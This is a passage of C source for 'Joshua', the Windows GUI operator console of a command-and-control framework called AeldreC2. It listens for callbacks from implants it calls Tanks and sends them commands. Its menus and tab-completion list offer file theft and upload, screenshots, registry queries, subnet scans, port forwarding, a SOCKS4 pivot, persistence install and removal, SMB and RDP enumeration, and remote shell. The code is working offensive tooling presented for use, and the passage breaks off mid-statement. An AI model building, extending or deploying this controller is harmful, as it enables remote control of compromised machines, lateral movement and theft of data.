    s->recv_mode       = RECV_TEXT;
    s->tls             = tls_flag && g_tls_avail;
    s->port            = port;
    strncpy(s->host, host ? host : "", 255);

    for (i=0; i<MAX_SESSIONS; i++) {
        if (!g_sess[i]) { g_sess[i]=s; break; }
    }
    if (i==MAX_SESSIONS) { free(s); return; }
    g_nsess++;

    memset(&mcs, 0, sizeof(mcs));
    mcs.szClass = "JoshuaChild";
    mcs.szTitle = listen_mode ? "Waiting for Tank..." : "Connecting...";
    mcs.hOwner  = g_hinst;
    mcs.x = mcs.y = mcs.cx = mcs.cy = CW_USEDEFAULT;
    mcs.style   = WS_VISIBLE;
    mcs.lParam  = (LPARAM)s;
    s->hwnd = (HWND)SendMessage(g_mdi, WM_MDICREATE, 0, (LPARAM)&mcs);

    if (listen_mode) {
        struct sockaddr_in addr;
        s->listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s->listen_sock == INVALID_SOCKET) goto fail;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family      = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port        = htons((unsigned short)port);
        if (bind(s->listen_sock,(struct sockaddr*)&addr,sizeof(addr))!=0 ||
            listen(s->listen_sock, 4)!=0) {
            char msg2[80]; sprintf(msg2,"[bind/listen on port %d failed]\r\n",port);
            session_append(s,msg2); goto fail;
        }
        WSAAsyncSelect(s->listen_sock, g_frame, WM_NC_SOCKET, FD_ACCEPT);
        s->state = NS_LISTENING;
        session_set_title(s);
        { char msg2[64]; sprintf(msg2,"[listening on port %d for Tanks]\r\n",port);
          session_append(s, msg2); }
    } else {
        s->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s->sock == INVALID_SOCKET) goto fail;
        s->dns_task = WSAAsyncGetHostByName(g_frame, WM_NC_DNS,
                                            host, s->dns_buf, sizeof(s->dns_buf));
        if (!s->dns_task) {
            char msg2[120]; sprintf(msg2,"[WSAAsyncGetHostByName failed: %d]\r\n",WSAGetLastError());
            session_append(s,msg2); goto fail;
        }
        s->state = NS_RESOLVING;
        session_set_title(s);
        { char msg2[288]; sprintf(msg2,"[resolving %s...]\r\n",host);
          session_append(s,msg2); }
    }
    return;
fail:
    session_close(s);
}

/* ================================================================
 * MDI child window proc
 * ================================================================ */
/* Known completable commands — Tab cycles through matching prefix */
static const char *k_tab_cmds[] = {
    /* Tank commands */
    "sysinfo", "ps", "ls ", "get ", "put ", "regq ", "screenshot",
    "portfwd ", "socks4 ", "relaystop",
    "smb", "smb shares", "smb view", "smb users", "smb groups",
    "smb admins", "smb acl ", "smb stat ", "smb sessions",
    "rdp", "rdp sessions", "rdp logoff ",
    "scan ", "cwd", "pwd", "cd ", "cat ", "less ", "persist", "persist remove",
    "shell",
    "exit", "quit",
    /* Console /commands */
    "/help", "/key", "/regenkey", "/ops", "/tanks",
    "/scansubnet ", "/script ", "/givemod ", "/removemod ", "/kick ", "/emote ",
    NULL
};

static int g_tab_idx = -1;          /* cycling position */
static char g_tab_stem[256] = "";   /* stem at Tab press time */

static LRESULT CALLBACK InputSubclass(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    if (msg == WM_KEYDOWN && wp == VK_RETURN) {
        HWND        child = GetParent(hwnd);
        JoshSession *s    = (JoshSession *)GetWindowLong(child, GWL_USERDATA);
        g_tab_idx = -1;   /* reset completion state on Enter */
        session_send(s);
        return 0;
    }

    if (msg == WM_KEYDOWN && wp == VK_TAB) {
        char  cur[512];
        int   curlen = GetWindowText(hwnd, cur, sizeof(cur));

        /* First Tab press: save the current text as stem */
        if (g_tab_idx == -1) {
            lstrcpyn(g_tab_stem, cur, sizeof(g_tab_stem));
        }

        /* Find next match after current index */
        {
            int    stem_len = lstrlen(g_tab_stem);
            int    start    = g_tab_idx + 1;
            int    i, found = -1;
            for (i = 0; k_tab_cmds[i]; i++) {
                int ci = (start + i) % (int)(sizeof(k_tab_cmds)/sizeof(k_tab_cmds[0]) - 1);
                if (!k_tab_cmds[ci]) break;
                if (stem_len == 0 || strncmp(g_tab_stem, k_tab_cmds[ci], stem_len) == 0) {
                    found = ci; break;
                }
            }
            if (found >= 0) {
                g_tab_idx = found;
                SetWindowText(hwnd, k_tab_cmds[found]);
                {
                    int clen = lstrlen(k_tab_cmds[found]);
                    SendMessage(hwnd, EM_SETSEL, clen, clen);
                }
            } else if (stem_len > 0) {
                /* Wrap: restore stem */
                g_tab_idx = -1;
                SetWindowText(hwnd, g_tab_stem);
                { int sl = lstrlen(g_tab_stem); SendMessage(hwnd, EM_SETSEL, sl, sl); }
            }
        }
        return 0;   /* consume Tab — don't let it move focus */
    }

    /* Any other key resets tab completion state */
    if (msg == WM_KEYDOWN && wp != VK_SHIFT && wp != VK_CONTROL && wp != VK_MENU)
        g_tab_idx = -1;

    return CallWindowProc(g_in_orig, hwnd, msg, wp, lp);
}

static LRESULT CALLBACK ChildProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    JoshSession *s = (JoshSession *)GetWindowLong(hwnd, GWL_USERDATA);

    switch (msg) {
    case WM_CREATE: {
        CREATESTRUCT    *cs = (CREATESTRUCT *)lp;
        MDICREATESTRUCT *mc = (MDICREATESTRUCT *)cs->lpCreateParams;
        HFONT hf   = (HFONT)GetStockObject(SYSTEM_FIXED_FONT);
        HWND  out, in, btn;
        int   show_input;
        s = (JoshSession *)mc->lParam;
        SetWindowLong(hwnd, GWL_USERDATA, (LONG)s);
        /* Operator read-only view hides input; tanks + console show it */
        show_input = (s->is_console || s->is_tank || (!s->is_op));
        out = CreateWindow("EDIT","",WS_CHILD|WS_VISIBLE|WS_VSCROLL|
                  ES_MULTILINE|ES_AUTOVSCROLL|ES_READONLY,
                  0,0,100,100,hwnd,(HMENU)IDC_OUT,g_hinst,NULL);
        SendMessage(out,WM_SETFONT,(WPARAM)hf,FALSE);
        in = CreateWindow("EDIT","",
                  (show_input ? WS_VISIBLE : 0)|WS_CHILD|WS_BORDER|ES_AUTOHSCROLL,
                  0,0,100,INPUT_H,hwnd,(HMENU)IDC_IN,g_hinst,NULL);
        SendMessage(in,WM_SETFONT,(WPARAM)hf,FALSE);
        if (!g_in_orig)
            g_in_orig=(WNDPROC)SetWindowLong(in,GWL_WNDPROC,(LONG)InputSubclass);
        else
            SetWindowLong(in,GWL_WNDPROC,(LONG)InputSubclass);
        btn = CreateWindow("BUTTON",
                  s->is_console ? "Exec" : "Send",
                  (show_input ? WS_VISIBLE : 0)|WS_CHILD|BS_PUSHBUTTON,
                  0,0,BTN_W,INPUT_H,hwnd,(HMENU)IDC_SEND,g_hinst,NULL);
        SendMessage(btn,WM_SETFONT,(WPARAM)hf,FALSE);
        return 0;
    }
    case WM_SIZE: {
        int w=LOWORD(lp), h=HIWORD(lp), iw=w-BTN_W-2;
        int has_input = (s && (s->is_console || s->is_tank || (!s->is_op)));
        if (has_input) {
            MoveWindow(GetDlgItem(hwnd,IDC_OUT), 0,0,w,h-INPUT_H-2,TRUE);
            MoveWindow(GetDlgItem(hwnd,IDC_IN),  0,h-INPUT_H,iw>0?iw:0,INPUT_H,TRUE);
            MoveWindow(GetDlgItem(hwnd,IDC_SEND),iw>0?iw:0,h-INPUT_H,BTN_W,INPUT_H,TRUE);
        } else {
            MoveWindow(GetDlgItem(hwnd,IDC_OUT), 0,0,w,h,TRUE);
        }
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wp)==IDC_SEND) { session_send(s); return 0; }
        break;
    case WM_CLOSE:
        session_close(s);
        break;
    case WM_DESTROY: {
        int i;
        for (i=0;i<MAX_SESSIONS;i++)
            if (g_sess[i]==s) { g_sess[i]=NULL; g_nsess--; break; }
        free(s);
        break;
    }
    }
    return DefMDIChildProc(hwnd, msg, wp, lp);
}

/* ================================================================
 * Frame window proc
 * ================================================================ */
static JoshSession *active_session(void)
{
    union { LRESULT r; HWND h; } u;
    u.r = SendMessage(g_mdi, WM_MDIGETACTIVE, 0, 0);
    if (!u.h) return NULL;
    return (JoshSession *)GetWindowLong(u.h, GWL_USERDATA);
}

static HMENU build_menu(void)
{
    HMENU bar   = CreateMenu();
    HMENU file  = CreatePopupMenu();
    HMENU tank  = CreatePopupMenu();
    HMENU win   = CreatePopupMenu();
    HMENU view  = CreatePopupMenu();
    HMENU help  = CreatePopupMenu();
    int i;

    AppendMenu(file, MF_STRING,    IDM_FILE_NEW,        "&New Session\tCtrl+N");
    AppendMenu(file, MF_STRING,    IDM_FILE_DISCONNECT, "&Disconnect");
    AppendMenu(file, MF_SEPARATOR, 0, NULL);
    AppendMenu(file, MF_STRING,    IDM_FILE_EXIT,       "E&xit");

    AppendMenu(tank, MF_STRING, IDM_TANK_SYSINFO,    "&Sysinfo");
    AppendMenu(tank, MF_STRING, IDM_TANK_PS,         "&Process List");
    AppendMenu(tank, MF_STRING, IDM_TANK_LS,         "&Directory Listing...");
    AppendMenu(tank, MF_STRING, IDM_TANK_GET,        "&Get File...");
    AppendMenu(tank, MF_STRING, IDM_TANK_PUT,        "&Put File...");
    AppendMenu(tank, MF_STRING, IDM_TANK_SCREENSHOT, "&Screenshot");
    AppendMenu(tank, MF_STRING, IDM_TANK_REGQ,       "&Registry Query...");
    AppendMenu(tank, MF_STRING, IDM_TANK_SCAN,       "Subnet &Scan...");
    AppendMenu(tank, MF_SEPARATOR, 0, NULL);
    AppendMenu(tank, MF_STRING, IDM_TANK_PORTFWD,    "&Port Forward...");
    AppendMenu(tank, MF_STRING, IDM_TANK_SOCKS4,     "&SOCKS4 Proxy...");
    AppendMenu(tank, MF_STRING, IDM_TANK_RELAYSTOP,  "Stop &Relays");
    AppendMenu(tank, MF_STRING, IDM_TANK_PKTVIEW,    "&Packet View");
    AppendMenu(tank, MF_SEPARATOR, 0, NULL);
    AppendMenu(tank, MF_STRING, IDM_TANK_SCRIPT_RUN, "Run &Script...");
    AppendMenu(tank, MF_STRING, IDM_TANK_MACRO_REC,  "&Record Macro");
    AppendMenu(tank, MF_STRING|MF_GRAYED, IDM_TANK_MACRO_SAVE, "&Save Macro...");
    AppendMenu(tank, MF_STRING, IDM_TANK_MACRO_PLAY, "&Play Macro...");

    AppendMenu(win,  MF_STRING,    IDM_WIN_TILE_H,   "Tile &Horizontal");
    AppendMenu(win,  MF_STRING,    IDM_WIN_TILE_V,   "Tile &Vertical");
    AppendMenu(win,  MF_STRING,    IDM_WIN_CASCADE,  "&Cascade");
    AppendMenu(win,  MF_SEPARATOR, 0, NULL);
    AppendMenu(win,  MF_STRING,    IDM_WIN_CLOSEALL, "Close &All");

    AppendMenu(help, MF_STRING, IDM_HELP_ABOUT, "&About");

    g_theme_menu = CreatePopupMenu();
    for (i = 0; i < THEME_COUNT; i++)
        AppendMenu(g_theme_menu, MF_STRING, IDM_VIEW_THEME_BASE + i,
                   g_themes[i].label);
    CheckMenuItem(g_theme_menu, (UINT)g_theme_idx,
                  MF_BYPOSITION | MF_CHECKED);
    AppendMenu(view, MF_POPUP, (UINT)g_theme_menu, "&Theme");

    AppendMenu(bar, MF_POPUP, (UINT)file, "&File");
    AppendMenu(bar, MF_POPUP, (UINT)tank, "&Tank");
    AppendMenu(bar, MF_POPUP, (UINT)win,  "&Window");
    AppendMenu(bar, MF_POPUP, (UINT)view, "&View");
    AppendMenu(bar, MF_POPUP, (UINT)help, "&Help");
    return bar;
}

static LRESULT CALLBACK FrameProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_CREATE: {
        CLIENTCREATESTRUCT ccs;
        HFONT hf = (HFONT)GetStockObject(DEFAULT_GUI_FONT);

        /* Session list on the left */
        g_sess_list = CreateWindow("LISTBOX", NULL,
                    WS_CHILD|WS_VISIBLE|WS_VSCROLL|WS_BORDER|LBS_NOTIFY|LBS_HASSTRINGS,
                    0, 0, SESS_LIST_W, 100, hwnd, (HMENU)IDC_SESS_LIST, g_hinst, NULL);
        if (g_sess_list)
            SendMessage(g_sess_list, WM_SETFONT, (WPARAM)hf, FALSE);

        /* MDI client fills the rest */
        ccs.hWindowMenu  = GetSubMenu(GetMenu(hwnd), 2);  /* Window menu at index 2 */
        ccs.idFirstChild = 30000;
        g_mdi = CreateWindow("MDICLIENT", NULL,
                    WS_CHILD|WS_CLIPCHILDREN|WS_VISIBLE,
                    SESS_LIST_W, 0, 0, 0, hwnd, (HMENU)1, g_hinst, &ccs);

        /* Create the local server-log / console pseudo-session */
        {
            MDICREATESTRUCT mcs2;
            JoshSession *cs = (JoshSession *)calloc(1, sizeof(JoshSession));
            if (cs) {
                int ci;
                char startup[256];
                cs->sock            = INVALID_SOCKET;
                cs->listen_sock     = INVALID_SOCKET;
                cs->file_recv_hfile = INVALID_HANDLE_VALUE;
                cs->scan_tsv        = INVALID_HANDLE_VALUE;
                cs->pkt_hwnd        = NULL;
                cs->recv_mode       = RECV_TEXT;
                cs->is_console      = 1;
                cs->state           = NS_CONNECTED;
                for (ci=0;ci<MAX_SESSIONS;ci++) {
                    if (!g_sess[ci]) { g_sess[ci]=cs; break; }
                }
                if (ci < MAX_SESSIONS) {
                    g_nsess++;
                    memset(&mcs2,0,sizeof(mcs2));
                    mcs2.szClass = "JoshuaChild";
                    mcs2.szTitle = "Server Log / Console";
                    mcs2.hOwner  = g_hinst;
                    mcs2.x = mcs2.y = mcs2.cx = mcs2.cy = CW_USEDEFAULT;
                    mcs2.style  = WS_VISIBLE;
                    mcs2.lParam = (LPARAM)cs;
                    cs->hwnd = (HWND)SendMessage(g_mdi, WM_MDICREATE,
                                                 0, (LPARAM)&mcs2);
                    g_console_sess = cs;
                    sprintf(startup,
                            "===== AeldreC2 Joshua =====\r\n"
                            "Server key : %s\r\n"
                            "Connect with:\r\n"
                            "  lightman.exe <your-ip> %d %s\r\n"
                            "  flynn.exe    <your-ip> %d %s\r\n"
                            "===========================\r\n"
                            "Type /help for available commands.\r\n"
                            "Type /regenkey to generate a new server key.\r\n",
                            g_server_key,
                            g_startup_port, g_server_key,
                            g_startup_port, g_server_key);
                    log_append(startup);
                } else {
                    free(cs);
                }
            }
        }
        new_session("", g_startup_port, 0, 1);
        return 0;
    }

    case WM_SIZE: {
        int w = (int)LOWORD(lp);
        int h = (int)HIWORD(lp);
        int mw = w > SESS_LIST_W ? w - SESS_LIST_W : 0;
        if (g_sess_list)
            MoveWindow(g_sess_list, 0, 0, SESS_LIST_W, h, TRUE);
        if (g_mdi)
            MoveWindow(g_mdi, SESS_LIST_W, 0, mw, h, TRUE);
        return 0;
    }

    case WM_NC_SOCKET:
        handle_socket_event((SOCKET)wp,
                            (int)WSAGETSELECTEVENT(lp),
                            (int)WSAGETSELECTERROR(lp));
        return 0;

    case WM_NC_DNS: {
        struct hostent    *he;
        struct sockaddr_in addr;
        JoshSession *s = session_by_dnstask((HANDLE)wp);
        int dns_err    = WSAGETASYNCERROR(lp);
        char msg2[288];
        if (!s) return 0;
        s->dns_task = NULL;
        if (dns_err) {
            sprintf(msg2,"[DNS failed for '%s': error %d]\r\n",s->host,dns_err);
            session_append(s,msg2); session_close(s); return 0;
        }
        he = (struct hostent *)s->dns_buf;
        memset(&addr,0,sizeof(addr));
        addr.sin_family = AF_INET;
        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
        addr.sin_port = htons((unsigned short)s->port);
        WSAAsyncSelect(s->sock, g_frame, WM_NC_SOCKET,
                       FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE);
        connect(s->sock,(struct sockaddr*)&addr,sizeof(addr));
        s->state = NS_CONNECTING;
        session_set_title(s);
        sprintf(msg2,"[connecting to %s:%d%s]\r\n",s->host,s->port,s->tls?" (TLS)":"");
        session_append(s,msg2);
        return 0;
    }

    case WM_COMMAND:
        /* Session list double-click: activate the selected MDI child */
        if (LOWORD(wp) == IDC_SESS_LIST && HIWORD(wp) == LBN_DBLCLK) {
            int sel = (int)SendMessage(g_sess_list, LB_GETCURSEL, 0, 0);
            if (sel != LB_ERR) {
                JoshSession *ts = (JoshSession *)
                    SendMessage(g_sess_list, LB_GETITEMDATA, (WPARAM)sel, 0);
                if (ts && ts->hwnd) {
                    union { HWND h; WPARAM w; } u;
                    u.h = ts->hwnd;
                    SendMessage(g_mdi, WM_MDIACTIVATE, u.w, 0);
                }
            }
            return 0;
        }

        switch (LOWORD(wp)) {
        case IDM_FILE_NEW:
            if (show_new_conn_dialog() && g_dlg_ok) {
                int port = atoi(g_dlg_port_buf);
                if (port > 0 && port <= 65535)
                    new_session(g_dlg_host_buf, port, g_dlg_tls_val, g_dlg_listen_val);
            }
            return 0;

        case IDM_FILE_DISCONNECT: {
            JoshSession *s = active_session();
            if (s) session_close(s);
            return 0;
        }

        case IDM_FILE_EXIT:
            DestroyWindow(hwnd); return 0;

        /* Tank commands ------------------------------------------- */
        case IDM_TANK_SYSINFO: {
            JoshSession *s = active_session();
            if (s) session_send_cmd(s, "sysinfo");
            return 0;
        }
        case IDM_TANK_PS: {
            JoshSession *s = active_session();
            if (s) session_send_cmd(s, "ps");
            return 0;
        }
        case IDM_TANK_LS: {
            JoshSession *s = active_session();
            if (s && show_input_box("Directory path (blank for current):", "Directory Listing")) {
                char cmd[MAX_PATH + 4];
                if (g_inp_buf[0])
                    sprintf(cmd, "ls %s", g_inp_buf);
                else
                    strcpy(cmd, "ls");
                session_send_cmd(s, cmd);
            }
            return 0;
        }
        case IDM_TANK_GET: {
            JoshSession *s = active_session();
            if (s && show_input_box("Remote file path to retrieve:", "Get File")) {
                char cmd[MAX_PATH + 4];
                sprintf(cmd, "get %s", g_inp_buf);
                session_send_cmd(s, cmd);
            }
            return 0;
        }
        case IDM_TANK_PUT: {
            JoshSession *s = active_session();
            if (s && s->state == NS_CONNECTED) {
                OPENFILENAME ofn;
                char local_path[MAX_PATH];
                local_path[0] = '\0';
                memset(&ofn, 0, sizeof(ofn));
                ofn.lStructSize = sizeof(ofn);
                ofn.hwndOwner   = hwnd;
                ofn.lpstrFile   = local_path;
                ofn.nMaxFile    = MAX_PATH;
                ofn.lpstrTitle  = "Select file to upload to Tank";
                ofn.Flags       = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
                if (GetOpenFileName(&ofn) &&
                    show_input_box("Remote path on target:", "Put File")) {
                    char cmd[MAX_PATH + 5];
                    strncpy(s->put_local_path, local_path, MAX_PATH - 1);
                    s->put_local_path[MAX_PATH - 1] = '\0';
                    s->put_pending = 1;
                    sprintf(cmd, "put %s", g_inp_buf);
                    session_send_cmd(s, cmd);
                }
            }
            return 0;
        }
        case IDM_TANK_SCREENSHOT: {
            JoshSession *s = active_session();
            if (s) session_send_cmd(s, "screenshot");
            return 0;
        }
        case IDM_TANK_PKTVIEW: {
            JoshSession *s = active_session();
            if (s && s->is_tank) {
                if (s->pkt_hwnd) {
                    /* Already open — bring to front                  */
                    union { HWND h; WPARAM w; } u; u.h = s->pkt_hwnd;
                    SendMessage(g_mdi, WM_MDIACTIVATE, u.w, 0);
                } else {
                    MDICREATESTRUCT mcs;
                    char title[MAX_PATH + 20];
                    sprintf(title, "Packets: %s",
                            s->tank_host[0] ? s->tank_host : "?");
                    memset(&mcs, 0, sizeof(mcs));
                    mcs.szClass = WC_PKTVIEW;
                    mcs.szTitle = title;
                    mcs.hOwner  = g_hinst;
                    mcs.x = mcs.y = CW_USEDEFAULT;
                    mcs.cx = 660; mcs.cy = 420;
                    mcs.style  = WS_VISIBLE;
                    mcs.lParam = (LPARAM)s;
                    s->pkt_hwnd = (HWND)SendMessage(g_mdi, WM_MDICREATE,
                                                    0, (LPARAM)&mcs);
                }
            }
            return 0;
        }
        case IDM_TANK_SCRIPT_RUN: {
            JoshSession *s = active_session();
            if (s && s->is_tank && !s->cmd_busy) {
                OPENFILENAME ofn; char path[MAX_PATH] = "";
                memset(&ofn,0,sizeof(ofn));
                ofn.lStructSize=sizeof(ofn); ofn.hwndOwner=hwnd;
                ofn.lpstrFilter="Script files (*.mac;*.txt)\0*.mac;*.txt\0All files\0*.*\0\0";
                ofn.lpstrFile=path; ofn.nMaxFile=MAX_PATH;
                ofn.lpstrTitle="Run Script on Tank";
                ofn.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
                if (GetOpenFileName(&ofn)) {
                    int n = script_load(s, path);
                    if (n > 0) {
                        char info[MAX_PATH+64];
                        sprintf(info,"[Script: %d commands from %s]\r\n",n,path);
                        session_append(s, info);
                        session_send_cmd(s, s->script_cmds[s->script_idx++]);
                    } else {
                        MessageBox(hwnd,"Cannot load script file.","Script",MB_OK|MB_ICONEXCLAMATION);
                    }
                }
            }
            return 0;
        }
        case IDM_TANK_MACRO_REC: {
            JoshSession *s = active_session();
            if (s && s->is_tank) {
                HMENU hm = GetSubMenu(GetMenu(hwnd), 1);
                if (!s->macro_rec) {
                    /* Start recording — clear any previous take      */
                    macro_free(s);
                    s->macro_rec = 1;
                    session_append(s, "[Macro recording started]\r\n");
                    CheckMenuItem(hm, IDM_TANK_MACRO_REC, MF_BYCOMMAND|MF_CHECKED);
                    EnableMenuItem(hm, IDM_TANK_MACRO_SAVE, MF_BYCOMMAND|MF_GRAYED);
                } else {
                    /* Stop recording                                  */
                    s->macro_rec = 0;
                    { char msg[64]; sprintf(msg,"[Macro stopped — %d commands recorded]\r\n",s->macro_count);
                      session_append(s,msg); }
                    CheckMenuItem(hm, IDM_TANK_MACRO_REC, MF_BYCOMMAND|MF_UNCHECKED);
                    if (s->macro_count > 0)
                        EnableMenuItem(hm, IDM_TANK_MACRO_SAVE, MF_BYCOMMAND|MF_ENABLED);
                }
            }
            return 0;
        }
        case IDM_TANK_MACRO_SAVE: {
            JoshSession *s = active_session();
            if (s && s->macro_cmds && s->macro_count > 0) {
                char path[MAX_PATH] = "macro.mac";
                if (macro_browse_save(path, MAX_PATH)) {
                    if (macro_save(s, path)) {
                        char msg[MAX_PATH+32];
                        sprintf(msg,"[Macro saved to %s]\r\n",path);
                        session_append(s,msg);
                    } else {
                        MessageBox(hwnd,"Could not save macro.","Save Macro",MB_OK|MB_ICONEXCLAMATION);
                    }
                }
            }
            return 0;
        }
        case IDM_TANK_MACRO_PLAY: {
            JoshSession *s = active_session();
            if (s && s->is_tank && !s->cmd_busy) {
                if (s->macro_cmds && s->macro_count > 0) {
                    char msg[64];
                    sprintf(msg,"[Playing macro — %d commands]\r\n",s->macro_count);
                    session_append(s,msg);
                    macro_play(s);
                } else {
                    /* No in-memory macro: offer to load from file     */
                    OPENFILENAME ofn; char path[MAX_PATH] = "";
                    memset(&ofn,0,sizeof(ofn));
                    ofn.lStructSize=sizeof(ofn); ofn.hwndOwner=hwnd;
                    ofn.lpstrFilter="Macro files (*.mac;*.txt)\0*.mac;*.txt\0All files\0*.*\0\0";
                    ofn.lpstrFile=path; ofn.nMaxFile=MAX_PATH;
                    ofn.lpstrTitle="Load and Play Macro";
                    ofn.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
                    if (GetOpenFileName(&ofn)) {
                        int n = script_load(s, path);
                        if (n > 0) {
                            char info[MAX_PATH+64];
                            sprintf(info,"[Macro: %d commands from %s]\r\n",n,path);
                            session_append(s,info);
                            session_send_cmd(s,s->script_cmds[s->script_idx++]);
                        }
                    }
                }
            }
            return 0;
        }
        case IDM_TANK_SCAN: {
            JoshSession *s = active_session();
            if (s && s->is_tank && !s->cmd_busy) {
                if (show_input_box("Target  (e.g. 192.168.1.0/24)\nOptional: append  -p ports  -b",
                                   "Subnet Scan")) {
                    /* Reuse /scansubnet logic via a synthetic line   */
                    char synth[ACCUM_SZ];
                    sprintf(synth, "/scansubnet %s", g_inp_buf);
                    local_console_cmd(synth);
                }
            }
            return 0;
        }
        case IDM_TANK_PORTFWD: {
            JoshSession *s = active_session();
            if (s && s->state == NS_CONNECTED) {
                if (show_input_box("Port forward  lport rhost rport\n(e.g. 8080 10.0.0.1 80):",
                                   "Port Forward")) {
                    char cmd[MAX_PATH + 12];
                    sprintf(cmd, "portfwd %s", g_inp_buf);
                    session_send_cmd(s, cmd);
                }
            }
            return 0;
        }
        case IDM_TANK_SOCKS4: {
            JoshSession *s = active_session();
            if (s && s->state == NS_CONNECTED) {
                if (show_input_box("Listen port for SOCKS4 proxy on implant:", "SOCKS4 Proxy")) {
                    char cmd[32];
                    sprintf(cmd, "socks4 %s", g_inp_buf);
                    session_send_cmd(s, cmd);
                }
            }
            return 0;
        }
        case IDM_TANK_RELAYSTOP: {
            JoshSession *s = active_session();
            if (s && s->state == NS_CONNECTED)
                session_send_cmd(s, "relaystop");
            return 0;
        }
        case IDM_TANK_REGQ: {
            JoshSession *s = active_session();
            if (s && show_input_box("Registry key (e.g. HKLM\\Software\\...):", "Registry Query")) {
                char cmd[MAX_PATH + 6];
                sprintf(cmd, "regq %s", g_inp_buf);
                session_send_cmd(s, cmd);
            }
            return 0;
        }
        /* Window -------------------------------------------------- */
        case IDM_WIN_TILE_H:
            SendMessage(g_mdi, WM_MDITILE, MDITILE_HORIZONTAL, 0); return 0;
        case IDM_WIN_TILE_V:
            SendMessage(g_mdi, WM_MDITILE, MDITILE_VERTICAL, 0);   return 0;
        case IDM_WIN_CASCADE:
            SendMessage(g_mdi, WM_MDICASCADE, 0, 0);                return 0;
        case IDM_WIN_CLOSEALL: {
            int i;
            for (i=0;i<MAX_SESSIONS;i++)
                if (g_sess[i]) session_close(g_sess[i]);
            return 0;
        }
        case IDM_HELP_ABOUT:
            MessageBox(hwnd,
                "Joshua  -  AeldreC2 C2 Controller\r\n\r\n"
                "Listen for incoming Tank callbacks.\r\n"
                "Use the Tank menu to send commands.\r\n"
                "Received files are saved to %%TEMP%%.\r\n\r\n"
                "AeldreC2 - Retro C2 for the masses.",
                "About Joshua", MB_OK|MB_ICONINFORMATION);
            return 0;
        default: {
            UINT id = LOWORD(wp);
            if (id >= (UINT)IDM_VIEW_THEME_BASE &&
                id <  (UINT)(IDM_VIEW_THEME_BASE + THEME_COUNT)) {
                theme_set((int)(id - IDM_VIEW_THEME_BASE));
                return 0;
            }
            break;
        }
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0); return 0;
    }
    return DefFrameProc(hwnd, g_mdi, msg, wp, lp);
}

/* ================================================================
 * WinMain
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow)
{
    WNDCLASS wc;
    MSG      msg;
    WSADATA  wsd;

    g_hinst = hInst;

    /* Single-instance guard: only one Joshua at a time */
    {
        HANDLE mtx = CreateMutex(NULL, TRUE, "AeldreC2_Joshua_Running_v1");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            HWND existing = FindWindow("JoshuaFrame", NULL);
            if (existing) {
                SetForegroundWindow(existing);
                if (IsIconic(existing)) ShowWindow(existing, SW_RESTORE);
            }
            MessageBox(NULL,
                "Joshua is already running.\n\nOnly one instance is allowed at a time.",
                "Joshua  \xe6ldreC2", MB_OK | MB_ICONINFORMATION);
            if (mtx) CloseHandle(mtx);
            return 0;
        }
        /* Leak the handle intentionally — keeps mutex held for process lifetime */
        (void)mtx;
    }

    log_open();
    gen_server_key();
    theme_load();

    if (WSAStartup(MAKEWORD(1,1), &wsd) != 0) {
        MessageBox(NULL,"WSAStartup failed.","Joshua",MB_OK|MB_ICONSTOP);
        return 1;
    }
    tls_load();

    if (!hPrev) {
        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=DlgProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_BTNFACE+1);
        wc.lpszClassName="JoshuaDlg";
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=InputBoxProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_BTNFACE+1);
        wc.lpszClassName="JoshuaInputBox";
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=ChildProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
        wc.lpszClassName="JoshuaChild";
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=FrameProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_APPWORKSPACE+1);
        wc.lpszClassName="JoshuaFrame";
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=NotifProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
        wc.lpszClassName=WC_NOTIF;
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=StartupCfgProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_BTNFACE+1);
        wc.lpszClassName="JoshuaStartupCfg";
        RegisterClass(&wc);

        memset(&wc,0,sizeof(wc));
        wc.lpfnWndProc=PktViewProc; wc.hInstance=hInst;
        wc.hCursor=LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
        wc.lpszClassName=WC_PKTVIEW;
        RegisterClass(&wc);
    }

    /* Show startup config: let user confirm port and view/regenerate key */
    show_startup_config();

    g_frame = CreateWindow("JoshuaFrame", "Joshua  \xe6ldreC2",
                  WS_OVERLAPPEDWINDOW|WS_CLIPCHILDREN,
                  CW_USEDEFAULT, CW_USEDEFAULT,
